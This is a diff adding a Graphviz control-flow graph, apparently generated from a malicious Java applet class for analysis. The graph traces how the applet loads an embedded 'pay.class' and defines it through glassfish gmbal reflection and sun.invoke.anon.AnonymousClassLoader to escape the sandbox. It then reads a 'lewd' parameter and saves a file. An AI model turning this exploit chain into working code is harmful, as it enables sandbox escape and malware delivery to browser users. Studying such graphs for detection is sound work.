@@ -1,0 +1,120 @@
+digraph "" {
+    "r0 := @this: ldk"
+    "new java.io.ByteArrayOutputStream"
+    "r0 := @this: ldk"->"new java.io.ByteArrayOutputStream";
+    "store.r $r9"
+    "new java.io.ByteArrayOutputStream"->"store.r $r9";
+    "load.r $r9"
+    "store.r $r9"->"load.r $r9";
+    "specialinvoke <java.io.ByteArrayOutputStream: void <init>()>"
+    "load.r $r9"->"specialinvoke <java.io.ByteArrayOutputStream: void <init>()>";
+    "push 8192"
+    "specialinvoke <java.io.ByteArrayOutputStream: void <init>()>"->"push 8192";
+    "newarray"
+    "push 8192"->"newarray";
+    "store.r r21"
+    "newarray"->"store.r r21";
+    "load.r r0"
+    "store.r r21"->"load.r r0";
+    "virtualinvoke <java.lang.Object: java.lang.Class getClass()>"
+    "load.r r0"->"virtualinvoke <java.lang.Object: java.lang.Class getClass()>";
+    "push \"pay.class\""
+    "virtualinvoke <java.lang.Object: java.lang.Class getClass()>"->"push \"pay.class\"";
+    "virtualinvoke <java.lang.Class: java.io.InputStream getResourceAsStream(java.lang.String)>"
+    "push \"pay.class\""->"virtualinvoke <java.lang.Class: java.io.InputStream getResourceAsStream(java.lang.String)>";
+    "store.r r1"
+    "virtualinvoke <java.lang.Class: java.io.InputStream getResourceAsStream(java.lang.String)>"->"store.r r1";
+    "goto load.r r1"
+    "store.r r1"->"goto load.r r1";
+    "load.r r1"
+    "goto load.r r1"->"load.r r1";
+    "load.r r21"
+    "load.r r1"->"load.r r21";
+    "virtualinvoke <java.io.InputStream: int read(byte[])>"
+    "load.r r21"->"virtualinvoke <java.io.InputStream: int read(byte[])>";
+    "store.i $i1"
+    "virtualinvoke <java.io.InputStream: int read(byte[])>"->"store.i $i1";
+    "load.i $i1"
+    "store.i $i1"->"load.i $i1";
+    "ifgt load.r $r9"
+    "load.i $i1"->"ifgt load.r $r9";
+    "ifgt load.r $r9"->"load.r $r9";
+    "virtualinvoke <java.io.ByteArrayOutputStream: byte[] toByteArray()>"
+    "load.r $r9"->"virtualinvoke <java.io.ByteArrayOutputStream: byte[] toByteArray()>";
+    "virtualinvoke <java.io.ByteArrayOutputStream: byte[] toByteArray()>"->"store.r $r9";
+    "new org.glassfish.gmbal.util.GenericConstructor"
+    "store.r $r9"->"new org.glassfish.gmbal.util.GenericConstructor";
+    "dup1.r"
+    "new org.glassfish.gmbal.util.GenericConstructor"->"dup1.r";
+    "push class \"Ljava/lang/Object;\""
+    "dup1.r"->"push class \"Ljava/lang/Object;\"";
+    "push \"sun.invoke.anon.AnonymousClassLoader\""
+    "push class \"Ljava/lang/Object;\""->"push \"sun.invoke.anon.AnonymousClassLoader\"";
+    "push 0"
+    "push \"sun.invoke.anon.AnonymousClassLoader\""->"push 0";
+    "push 0"->"newarray";
+    "specialinvoke <org.glassfish.gmbal.util.GenericConstructor: void <init>(java.lang.Class,java.lang.String,java.lang.Class[])>"
+    "newarray"->"specialinvoke <org.glassfish.gmbal.util.GenericConstructor: void <init>(java.lang.Class,java.lang.String,java.lang.Class[])>";
+    "specialinvoke <org.glassfish.gmbal.util.GenericConstructor: void <init>(java.lang.Class,java.lang.String,java.lang.Class[])>"->"push 0";
+    "push 0"->"newarray";
+    "virtualinvoke <org.glassfish.gmbal.util.GenericConstructor: java.lang.Object create(java.lang.Object[])>"
+    "newarray"->"virtualinvoke <org.glassfish.gmbal.util.GenericConstructor: java.lang.Object create(java.lang.Object[])>";
+    "virtualinvoke <org.glassfish.gmbal.util.GenericConstructor: java.lang.Object create(java.lang.Object[])>"->"store.r r1";
+    "store.r r1"->"load.r r1";
+    "load.r r1"->"virtualinvoke <java.lang.Object: java.lang.Class getClass()>";
+    "push \"loadClass\""
+    "virtualinvoke <java.lang.Object: java.lang.Class getClass()>"->"push \"loadClass\"";
+    "push 1"
+    "push \"loadClass\""->"push 1";
+    "push 1"->"newarray";
+    "newarray"->"dup1.r";
+    "dup1.r"->"push 0";
+    "push class \"[B\""
+    "push 0"->"push class \"[B\"";
+    "arraywrite.r"
+    "push class \"[B\""->"arraywrite.r";
+    "staticinvoke <org.glassfish.gmbal.ManagedObjectManagerFactory: java.lang.reflect.Method getMethod(java.lang.Class,java.lang.String,java.lang.Class[])>"
+    "arraywrite.r"->"staticinvoke <org.glassfish.gmbal.ManagedObjectManagerFactory: java.lang.reflect.Method getMethod(java.lang.Class,java.lang.String,java.lang.Class[])>";
+    "staticinvoke <org.glassfish.gmbal.ManagedObjectManagerFactory: java.lang.reflect.Method getMethod(java.lang.Class,java.lang.String,java.lang.Class[])>"->"load.r r1";
+    "load.r r1"->"push 1";
+    "push 1"->"newarray";
+    "newarray"->"dup1.r";
+    "dup1.r"->"push 0";
+    "push 0"->"load.r $r9";
+    "load.r $r9"->"arraywrite.r";
+    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"
+    "arraywrite.r"->"virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>";
+    "checkcast"
+    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"->"checkcast";
+    "virtualinvoke <java.lang.Class: java.lang.Object newInstance()>"
+    "checkcast"->"virtualinvoke <java.lang.Class: java.lang.Object newInstance()>";
+    "pop"
+    "virtualinvoke <java.lang.Class: java.lang.Object newInstance()>"->"pop";
+    "pop"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "push \"lewd\""
+    "load.r r0"->"push \"lewd\"";
+    "virtualinvoke <ldk: java.lang.String getParameter(java.lang.String)>"
+    "push \"lewd\""->"virtualinvoke <ldk: java.lang.String getParameter(java.lang.String)>";
+    "push \"\\d\""
+    "virtualinvoke <ldk: java.lang.String getParameter(java.lang.String)>"->"push \"\\d\"";
+    "push \"\""
+    "push \"\\d\""->"push \"\"";
+    "virtualinvoke <java.lang.String: java.lang.String replaceAll(java.lang.String,java.lang.String)>"
+    "push \"\""->"virtualinvoke <java.lang.String: java.lang.String replaceAll(java.lang.String,java.lang.String)>";
+    "virtualinvoke <ldk: java.lang.String saveFile(java.lang.String)>"
+    "virtualinvoke <java.lang.String: java.lang.String replaceAll(java.lang.String,java.lang.String)>"->"virtualinvoke <ldk: java.lang.String saveFile(java.lang.String)>";
+    "virtualinvoke <ldk: java.lang.String saveFile(java.lang.String)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "virtualinvoke <ldk: java.lang.String saveFile(java.lang.String)>"->"store.r r0";
+    "ifgt load.r $r9"->"load.r $r9";
+    "load.r $r9"->"load.r r21";
+    "load.r r21"->"push 0";
+    "push 0"->"load.i $i1";
+    "virtualinvoke <java.io.ByteArrayOutputStream: void write(byte[],int,int)>"
+    "load.i $i1"->"virtualinvoke <java.io.ByteArrayOutputStream: void write(byte[],int,int)>";
+}
